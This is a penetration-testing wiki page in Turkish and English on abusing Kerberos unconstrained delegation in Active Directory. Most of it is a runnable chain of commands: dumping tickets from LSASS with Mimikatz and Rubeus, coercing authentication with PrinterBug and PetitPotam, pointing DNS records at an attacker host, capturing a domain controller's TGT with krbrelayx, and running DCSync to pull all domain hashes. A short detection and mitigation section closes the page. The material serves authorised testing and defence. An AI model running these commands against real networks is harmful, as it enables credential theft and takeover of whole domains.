# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, bir Domain Administrator’ın domain içindeki herhangi bir **Computer** üzerinde ayarlayabileceği bir özelliktir. Ardından, bir **user logins** o Computer’a her giriş yaptığında, o kullanıcının **TGT’sinin bir kopyası** DC tarafından sağlanan **TGS’nin içine gönderilecek** ve **LSASS içinde memory’de kaydedilecektir**. Yani, makinede Administrator ayrıcalıklarına sahipseniz, **ticket’ları dump edebilir ve users’ları taklit edebilirsiniz** any machine üzerinde.

Yani bir domain admin, "Unconstrained Delegation" feature etkin olan bir Computer’a giriş yaparsa ve siz o makinede local admin ayrıcalıklarına sahipseniz, ticket’ı dump edebilir ve Domain Admin’i domain’de her yerde taklit edebilirsiniz (domain privesc).

[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute’unun [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek bu attribute’a sahip Computer objects bulabilirsiniz. Bunu, powerview’in yaptığı gibi, ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filter’ı ile yapabilirsiniz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
**Mimikatz** veya **Rubeus** ile Administrator’ın (veya kurban kullanıcının) ticket’ını belleğe yükleyin; bu, [**Pass the Ticket**](pass-the-ticket.md) içindir.**\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Unconstrained delegation hakkında ired.team’de daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Bir saldırgan **"Unconstrained Delegation"** için izin verilen bir bilgisayarı **compromise** edebilirse, bir **Print server**’ı ona karşı **otomatik olarak login** olmaya **aldatabilir** ve sunucunun belleğinde bir **TGT** kaydedilmesini sağlayabilir.\
Ardından saldırgan, **Print server bilgisayar hesabını taklit etmek** için bir **Pass the Ticket attack** gerçekleştirebilir.

Bir print server’ın herhangi bir makineye login olmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Eğer TGT bir domain controller’dan ise, [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) gerçekleştirebilir ve DC’den tüm hash’leri elde edebilirsiniz.\
[**Bu saldırı hakkında daha fazla bilgi ired.team’de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Burada **authentication** zorlamak için başka yollar bulunur:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Mağdurun **Kerberos** ile unconstrained-delegation host’unuza authentication yapmasını sağlayan başka herhangi bir coercion primitive de çalışır. Modern ortamlarda bu çoğu zaman, hangi RPC yüzeyinin erişilebilir olduğuna bağlı olarak klasik PrinterBug akışını **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** veya **WebClient/WebDAV** tabanlı coercion ile değiştirmek anlamına gelir.

### Unconstrained delegation ile bir user/service account’u abuse etmek

Unconstrained delegation **yalnızca computer object’lerle sınırlı değildir**. Bir **user/service account** da `TRUSTED_FOR_DELEGATION` olarak yapılandırılabilir. Bu senaryoda pratik gereksinim, account’un sahip olduğu bir **SPN** için Kerberos service ticket’leri almasıdır.

Bu durum 2 çok yaygın offensive yol açar:

1. Unconstrained-delegation **user account**’unun password/hash’ini ele geçirir, ardından aynı account’a bir **SPN** eklersiniz.
2. Account’un zaten bir veya daha fazla SPN’i vardır, ancak bunlardan biri **eski/devre dışı bırakılmış bir hostname**’e işaret eder; eksik **DNS A record**’unu yeniden oluşturmak, SPN kümesini değiştirmeden authentication akışını hijack etmek için yeterlidir.

Minimal Linux akışı:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notlar:

- Bu, özellikle unconstrained principal bir **service account** olduğunda ve sadece credentials’a sahip olduğunuzda, joined bir host üzerinde code execution olmadığında çok kullanışlıdır.
- Hedef user’ın zaten bir **stale SPN**’i varsa, ilgili **DNS record**’unu yeniden oluşturmak, AD içine yeni bir SPN yazmaktan daha az noisy olabilir.
- Son dönemdeki Linux-centric tradecraft, `addspn.py`, `dnstool.py`, `krbrelayx.py` ve tek bir coercion primitive kullanır; zinciri tamamlamak için bir Windows host’a dokunmanız gerekmez.

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domain’lerde sıklıkla `MachineAccountQuota > 0` (varsayılan 10) bulunur; bu da kimliği doğrulanmış herhangi bir principal’ın N adet computer object oluşturmasına izin verir. Ayrıca `SeEnableDelegationPrivilege` token privilege’ına (veya eşdeğer yetkilere) sahipseniz, yeni oluşturulan computer’ı unconstrained delegation için trusted olacak şekilde ayarlayabilir ve privileged sistemlerden gelen inbound TGT’leri ele geçirebilirsiniz.

High-level akış:

1) Kontrol ettiğiniz bir computer oluşturun
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Sahte hostname’i domain içinde çözülebilir hale getirin
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Saldırganın kontrolündeki bilgisayarda Unconstrained Delegation'ı etkinleştirin
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Neden bu çalışır: unconstrained delegation ile, delegation-enabled bir bilgisayardaki LSA gelen TGT’leri cache’ler. Bir DC’yi veya privileged server’ı sahte host’una authenticate etmeye kandırırsan, onun machine TGT’si saklanır ve export edilebilir.

4) krbrelayx’i export mode’da başlat ve Kerberos materyalini hazırla
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/sunuculardan sahte hostunuza authentication zorla
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx, bir makine kimlik doğrulaması yaptığında ccache dosyalarını kaydeder, örneğin:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Yakalanan DC makine TGT’sini DCSync gerçekleştirmek için kullanın
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notlar ve gereksinimler:

- `MachineAccountQuota > 0`, ayrıcalıksız computer oluşturmayı etkinleştirir; aksi halde açık yetkilere ihtiyacın vardır.
- Bir computer üzerinde `TRUSTED_FOR_DELEGATION` ayarlamak `SeEnableDelegationPrivilege` gerektirir (veya domain admin).
- Sahte host’una name resolution olduğundan emin ol (DNS A record), böylece DC ona FQDN ile erişebilir.
- Coercion, uygulanabilir bir vector gerektirir (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, vb.). Mümkünse bunları DC’lerde devre dışı bırak.
- Eğer kurban account **"Account is sensitive and cannot be delegated"** olarak işaretliyse veya **Protected Users** üyesiyse, forwarded TGT service ticket içine dahil edilmez; bu yüzden bu zincir yeniden kullanılabilir bir TGT vermez.
- Kimlik doğrulayan client/server üzerinde **Credential Guard** etkinse, Windows **Kerberos unconstrained delegation** işlemini engeller; bu da normalde geçerli olan coercion yollarının operatör açısından başarısız görünmesine neden olabilir.

Detection ve hardening fikirleri:

- UAC `TRUSTED_FOR_DELEGATION` ayarlı olduğunda Event ID 4741 (computer account created) ve 4742/4738 (computer/user account changed) için alarm üret.
- Domain zone içinde alışılmadık DNS A-record eklemelerini izle.
- Beklenmeyen host’lardan gelen 4768/4769 artışlarını ve DC-authentications’ın DC olmayan host’lara gitmesini takip et.
- `SeEnableDelegationPrivilege` yetkisini minimal bir kümeyle sınırla, mümkün olan yerlerde `MachineAccountQuota=0` yap ve DC’lerde Print Spooler’ı devre dışı bırak. LDAP signing ve channel binding zorunlu kıl.

### Mitigation

- DA/Admin girişlerini belirli service’lerle sınırla
- Privileged account’lar için "Account is sensitive and cannot be delegated" ayarla.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
